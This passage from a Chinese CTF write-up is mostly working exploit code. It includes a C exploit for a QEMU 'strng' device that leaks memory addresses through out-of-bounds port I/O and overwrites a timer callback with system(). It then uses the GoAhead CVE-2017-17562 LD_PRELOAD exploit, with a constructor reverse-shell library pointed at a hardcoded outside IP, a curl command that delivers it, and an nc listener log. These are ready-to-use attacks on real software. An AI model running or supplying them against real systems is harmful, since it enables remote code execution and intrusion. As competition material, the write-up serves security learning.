include <stdio.h>
include <stdlib.h>
include <string.h>
include <sys/mman.h>
include <sys/types.h>
include <unistd.h>
include<sys/io.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value,addr);
}


uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

uint32_t pmio_arbread(uint32_t offset)
{
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main(int argc, char *argv[])
{
    
    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = (char*)mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
   
    
    //mmio_write(12,0x6f6f722f);
    //mmio_write(16,0x6c662f74);
    //mmio_write(20,0x6761);

    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 )
        die("I/O permission is not enough");

   
    // leak heap address
    uint64_t timer_list_addr = pmio_arbread(0x10c);
    timer_list_addr = timer_list_addr << 32;
    timer_list_addr += pmio_arbread(0x108);
    printf("[+] leak timer_list addr: 0x%lx\n", timer_list_addr);

    // leak text addr
    uint64_t cb_addr = pmio_arbread(0x114);
    cb_addr = cb_addr << 32;
    cb_addr += pmio_arbread(0x110);
    uint64_t text_base = cb_addr - 0x29ac8e;
    uint64_t system_addr = text_base + 0x200D50;
    printf("[+] leak cb addr: 0x%lx\n", cb_addr);
    printf("[+] text base: 0x%lx\n", text_base);
    printf("[+] system addr: 0x%lx\n", system_addr);
    // leak opaque addr
    uint64_t opaque_addr = pmio_arbread(0x11c);
    opaque_addr = opaque_addr << 32;
    opaque_addr += pmio_arbread(0x118);
    printf("[+] leak opaque addr: 0x%lx\n", opaque_addr);
    

    // write parameter addr first
    
    //pmio_abwrite(0x0, 0xffffffff);
    uint64_t para_addr = opaque_addr + 0xb04;
    pmio_abwrite(0x118, para_addr & 0xffffffff);

    // set flag first and then overwrite timer func pointer and trigger timer
    mmio_write(12,0x20746163); // 'cat '
    mmio_write(16, 0x67616c66); // 'flag'
    pmio_abwrite(0x110, system_addr & 0xffffffff);
    printf("[+] flag: \n");


    /*
    // leaking libc address 
    uint64_t srandom_addr=pmio_arbread(0x108);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_arbread(0x104);
    printf("leaking srandom addr: 0x%lx\n",srandom_addr);
    uint64_t libc_base= srandom_addr-0x43bb0;
    uint64_t system_addr= libc_base+0x4f440;
    printf("libc base: 0x%lx\n",libc_base);
    printf("system addr: 0x%lx\n",system_addr);

    // leaking heap address
    uint64_t heap_addr=pmio_arbread(0x1d0);
    heap_addr=heap_addr<<32;
    heap_addr+=pmio_arbread(0x1cc);
    printf("leaking heap addr: 0x%lx\n",heap_addr);
    uint64_t para_addr=heap_addr+0x39c7c;
    printf("parameter addr: 0xlx\n",para_addr);

    // overwrite rand_r pointer to system
    pmio_abwrite(0x114,system_addr&0xffffffff);

    mmio_write(0xc,0);
    */
     
}
```
### 大数据
访问网站之后从源码中看到一个cgi链接，点进去发现用的GoAhead，所以直接参考泽哥的文章，exp直接秒掉

文章：[CVE-2017-17562 GoAhead远程代码执行漏洞分析](https://ray-cp.github.io/archivers/CVE-2017-17562-GoAhead-rce)

exp
```
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>

char *server_ip="202.182.115.203";
uint32_t server_port=7771;

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void) 
{
  //socket initialize
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(server_port);
  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
  //connect to the server
  if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
    exit(0);
  //dup the socket to stdin, stdout and stderr
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  //execute /bin/sh to get a shell
  execve("/bin/sh", 0, 0);
}
```


exp的使用
```
gcc -shared -fPIC ./exp.c -o exp.so
curl -X POST --data-binary @exp.so http://183.129.189.62:14000/cgi-bin/index\?LD_PRELOAD\=/proc/self/fd/0
```
之后服务器上进行监听即可
```
root@zerosll:~# nc -lvnp 7771
Listening on [0.0.0.0] (family 0, port 7771)
Connection from [183.129.189.58] port 7771 [tcp/*] accepted (family 2, sport 54228)
cat /start.sh
#!/bin/sh
# Add your startup script

# DO NOT DELETE
# /etc/init.d/xinetd start;
echo "$1";
echo "$1" > /home/ctf/flag;
while :
do
/usr/sbin/chroot --userspec 1000:1000 / /home/ctf/goahead -v --home /home/ctf/test /home/ctf/test/web 9999
done
cat /home/ctf/flag
flag{2392862153ef30405ef5c972139102be}
```
# 评论区